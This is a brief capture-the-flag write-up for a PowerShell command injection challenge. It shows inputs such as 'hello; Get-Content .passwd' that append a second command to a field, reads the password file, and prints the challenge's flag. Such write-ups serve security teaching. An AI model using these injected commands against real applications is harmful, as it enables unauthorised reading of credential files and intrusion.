---
layout: default
title: Powershell-Command-Injection
---
From the name of the challenge we can guess this is related to `powershell injection`.
I tried giving simple payload like `hello; pwd`:
```ps
Table to dump:
> hello ; pwd
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADMAKwBtAEsAaQBjAEUAVAB3AFYAMwBtADIAMwA2AGQANgBQAGcAbwBoAHcAPQA9AHwAMQ
AzAGIAZgA2AGUANABjADMAYQBiADMANQBjADQANgAzAGUAYQBmADgANQAwADMAMwA3ADkAYQBmADUANAA0AGMAMwAwAGYAZgA1ADUANwAwAGMAYgA5ADIANgA3AGMAYQAwADkAMgAzADMANwA0ADUAOQA3AD
EAZABiADYAMwAxADAAMgA4AGQAMAAwAGMAOABmADAAZQBiADUANABiAGMAYQBiAGQAZQAwADkAMwA5ADgAMQBlADUAMQA5AGQA. Backup the table hello
Path
----
C:\cygwin64\challenge\app-script\ch18
C:\cygwin64\challenge\app-script\ch18
```

Then, I read the file `.passwd`:
```ps
> hello; Get-Content .passwd
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADMAKwBtAEsAaQBjAEUAVAB3AFYAMwBtADIAMwA2AGQANgBQAGcAbwBoAHcAPQA9AHwAMQ
AzAGIAZgA2AGUANABjADMAYQBiADMANQBjADQANgAzAGUAYQBmADgANQAwADMAMwA3ADkAYQBmADUANAA0AGMAMwAwAGYAZgA1ADUANwAwAGMAYgA5ADIANgA3AGMAYQAwADkAMgAzADMANwA0ADUAOQA3AD
EAZABiADYAMwAxADAAMgA4AGQAMAAwAGMAOABmADAAZQBiADUANABiAGMAYQBiAGQAZQAwADkAMwA5ADgAMQBlADUAMQA5AGQA. Backup the table hello
SecureIEXpassword
```
![Pasted image 20260310103418.png](./images/images/Pasted image 20260310103418.png)

So, the password is **SecureIEXpassword**